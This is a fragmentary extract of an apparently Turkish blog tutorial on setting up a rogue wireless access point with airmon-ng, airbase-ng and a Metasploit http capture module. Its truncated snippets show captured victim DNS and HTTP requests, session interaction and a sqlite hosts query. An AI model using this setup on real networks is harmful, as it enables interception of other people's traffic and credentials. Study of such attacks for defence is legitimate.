...
<h2 class="wp-block-heading" id="libsqlite3-dev-paketini-kuralım">libsqlite3-dev Paketini Kuralım
<!-- /wp:heading -->
...
<h2 class="wp-block-heading" id="activerecord-sqlite3-ruby-modülleri-kuralım">activerecord sqlite3 Ruby Modülleri Kuralım
<!-- /wp:heading -->
...
<h2 class="wp-block-heading" id="wireless-arayüz-adını-tespit-edelim">Wireless Arayüz Adını Tespit Edelim
<!-- /wp:heading -->
...
<h2 class="wp-block-heading" id="airmon-ng-başlatalım">airmon-ng Başlatalım
<!-- /wp:heading -->
...
<h2 class="wp-block-heading" id="monitor-mod-ile-airbase-ng-başlatalım">Monitor Mod ile airbase-ng Başlatalım
<!-- /wp:heading -->
...
<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf auxiliary***(*** http***)***  ***&gt;*** 
...
<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">***[*** ******* ***]***  DNS 10.0.0.100:1284 XID 92 ***(*** IN::A <a href="http://ecademy.com/">ecademy.com</a>***)*** 
...
<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">***[*** ******* ***]***  HTTP REQUEST 10.0.0.100 ***&gt;***  <a href="http://gmail.google.com/">gmail.google.com</a>:80 GET /forms.html Windows IE 5.01 cook
...
<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf auxiliary***(*** http***)***  ***&gt;***  sessions -i 1
...
<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">sqlite&gt; ***select***  *******  from hosts;
